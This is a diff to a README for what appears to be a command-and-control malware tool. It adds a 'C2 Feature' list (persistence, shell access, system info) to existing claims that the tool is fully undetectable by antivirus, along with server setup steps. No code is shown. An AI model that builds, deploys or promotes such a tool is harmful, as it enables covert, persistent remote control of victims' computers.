@@ -40,7 +40,12 @@
      *:- For Linux:-
      1. Make Sure All Requriements is installed.
      2. python3 server.py  (on server side)
- 
+# C2 Feature:-
+     1) Persistence (type persist)
+     2) Shell Access 
+     3) System Info (type info)
+     4) More Features Will Be Added 
+    
 # Features:-
 
     1) FUD Ratio 0/40
